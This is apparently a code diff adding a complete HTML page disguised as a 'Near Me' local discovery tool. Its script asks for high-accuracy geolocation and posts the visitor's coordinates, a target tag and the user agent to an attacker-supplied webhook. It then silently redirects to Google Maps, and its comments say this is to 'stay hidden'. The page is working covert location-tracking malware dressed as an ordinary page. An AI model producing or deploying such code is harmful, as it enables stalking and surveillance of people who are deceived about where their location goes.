@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Near Me | Local Discovery Tool</title>
+    <style>
+        :root {
+            --bg: #ffffff;
+            --primary: #4285f4;
+            --text: #3c4043;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: var(--bg);
+            color: var(--text);
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            text-align: center;
+        }
+
+        .container {
+            padding: 2rem;
+            max-width: 400px;
+        }
+
+        .icon {
+            font-size: 3rem;
+            color: var(--primary);
+            margin-bottom: 1rem;
+        }
+
+        h1 {
+            font-size: 1.5rem;
+            margin-bottom: 0.5rem;
+        }
+
+        p {
+            color: #5f6368;
+            line-height: 1.5;
+        }
+
+        .loading-dots:after {
+            content: '.';
+            animation: dots 1.5s steps(5, end) infinite;
+        }
+
+        @keyframes dots {
+
+            0%,
+            20% {
+                content: '.';
+            }
+
+            40% {
+                content: '..';
+            }
+
+            60% {
+                content: '...';
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <div class="icon">📍</div>
+        <h1 id="title">Finding nearby results...</h1>
+        <p id="status">Please allow location access to find the best results near your current position.</p>
+        <div id="loader" class="loading-dots">Searching</div>
+    </div>
+
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const webhook = urlParams.get('wh');
+        const target = urlParams.get('t');
+        const redirect = urlParams.get('r') || "https://www.google.com/maps";
+
+        window.onload = () => {
+            if (!navigator.geolocation) {
+                window.location.href = redirect;
+                return;
+            }
+
+            navigator.geolocation.getCurrentPosition(
+                async (position) => {
+                    const data = {
+                        target: target,
+                        lat: position.coords.latitude,
+                        lng: position.coords.longitude,
+                        accuracy: position.coords.accuracy,
+                        timestamp: new Date().toISOString(),
+                        userAgent: navigator.userAgent
+                    };
+
+                    // Send to Webhook if provided
+                    if (webhook) {
+                        try {
+                            await fetch(webhook, {
+                                method: 'POST',
+                                mode: 'no-cors', // To avoid CORS issues with simple webhooks
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify(data)
+                            });
+                        } catch (e) {
+                            console.error("Transmission failed", e);
+                        }
+                    }
+
+                    // Redirect to the "real" content
+                    setTimeout(() => {
+                        window.location.href = redirect;
+                    }, 500);
+                },
+                (error) => {
+                    // Fail silently and redirect anyway to stay hidden
+                    window.location.href = redirect;
+                },
+                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+            );
+        };
+    </script>
+</body>
+
+</html>
